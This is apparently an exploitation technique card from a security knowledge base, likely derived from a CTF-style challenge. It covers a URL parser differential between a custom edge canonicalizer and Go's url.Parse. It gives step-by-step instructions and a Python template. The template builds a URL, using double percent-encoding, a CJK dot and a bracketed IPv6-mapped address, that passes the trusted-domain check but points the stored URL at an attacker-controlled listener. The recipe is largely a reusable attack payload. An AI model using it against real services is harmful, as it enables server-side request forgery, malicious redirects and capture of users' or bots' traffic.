---
name: url_authority_edge_canonicalization_bypass
vuln_type: ssrf
sub_technique: url_parsing_bypass
category: exploitation
safety_level: safe
---

# Url Authority Parsing Differential — Edge Canonicalization Vs Go Url.Parse

## When to Apply

A Go server validates URLs using a custom edge canonicalization function that double-decodes percent-encoding (`collapseEscapedHost`), replaces CJK fullwidth dots (。．｡) with ASCII dots, and strips IPv6 bracket sections under specific conditions (both decode AND compat dot used). The validated URL is then re-parsed with Go's `url.Parse` for actual use (storage, iframe src, redirect). The edge parser resolves the authority to a trusted domain (e.g., `brief.relaydesk.local`), while `url.Parse` resolves the same URL to an attacker-controlled host (IPv6-mapped IPv4 in brackets).

## Prerequisites

- Server uses a custom edge authority canonicalization with double percent-decoding
- CJK/fullwidth dot normalization (。→., ．→., ｡→.) in authority parsing
- IPv6 bracket stripping logic conditioned on both decode AND compat dot flags
- Go url.Parse used as the delivery/storage parser (different from edge validation)
- Validation explicitly requires edgeRef.Authority != deliveryRef.Authority (parsing differential is REQUIRED by design)
- Attacker needs external HTTP listener reachable from the bot's browser

## Steps

1. Identify the URL validation flow: edge canonicalization vs Go url.Parse
2. Craft a URL that satisfies the edge parser's trusted domain check:
   - Double-encode a character: `%2566` → edge decodes twice → `f`
   - Use CJK dot U+3002 (。) percent-encoded as `%E3%80%82` → edge normalizes to `.`
   - Append `[IPv6-mapped-IPv4]:port` after the CJK dot
   - Edge parser: strips brackets when both decode+compat flags set → sees `brief.relaydesk.local`
3. Go url.Parse resolves the same URL differently:
   - Single decode: `%2566` → `%66`, brackets parsed as IPv6 literal
   - Hostname() returns the IPv6 address (attacker's IP)
4. The stored URL (from url.Parse) points to attacker's server
5. When rendered in iframe/redirect, the browser connects to attacker

## Code Template

```
import urllib.parse\ndef callback_url(host, port, namespace):\n    parts = [int(p) for p in host.split('.')]\n    mapped = f'::ffff:{(parts[0]<<8)|parts[1]:x}:{(parts[2]<<8)|parts[3]:x}'\n    return f'http://brie%2566.relaydesk.local%E3%80%82[{mapped}]:{port}/notes/{namespace}'
```

## Examples

### Example 1

- **trusted_domain**: brief.relaydesk.local
- **edge_canon**: double percent-decode + CJK dot normalize + bracket strip
- **go_parser**: url.Parse → Hostname() returns IPv6 literal
- **url_pattern**: http://brie%2566.relaydesk.local%E3%80%82[::ffff:X:Y]:PORT/notes/...
- **validation_check**: edgeRef.Authority == expectedHost AND edgeRef.Authority != deliveryRef.Authority

This is a URL parser differential attack. The edge canonicalizer and Go's url.Parse interpret the same URL differently. The key trick is combining: (1) double percent-encoding (%2566 → %66 → f), (2) CJK dot 。 (U+3002, %E3%80%82) normalized to ASCII dot, and (3) IPv6 bracket stripping when both decode and compat-dot flags are set. The NormalizeReviewLink function explicitly requires the two parsers to disagree (deliveryRef != edgeRef), which is the design flaw that enables the attack.
